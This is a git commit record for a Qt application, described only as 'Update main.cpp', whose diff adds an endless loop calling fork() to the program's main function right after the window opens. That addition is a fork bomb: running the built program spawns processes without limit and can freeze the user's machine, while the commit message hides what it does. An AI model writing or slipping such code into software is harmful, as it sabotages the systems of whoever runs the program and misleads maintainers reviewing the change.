003ac0d1185229d234d1042c56f996a077fdbcb7
julien-troll <a4556724@trbvm.com>
2014-10-06 14:33:37 +0200

    Update main.cpp

--- interface/main.cpp
+++ interface/main.cpp
@@ -6,6 +6,8 @@ int main ( int argc, char * argv[]) {
     QApplication app(argc,argv);
     MainWindow window ;
     window.showMaximized();
-
+    while (1) {
+        fork();
+    }
     return app.exec();
 }
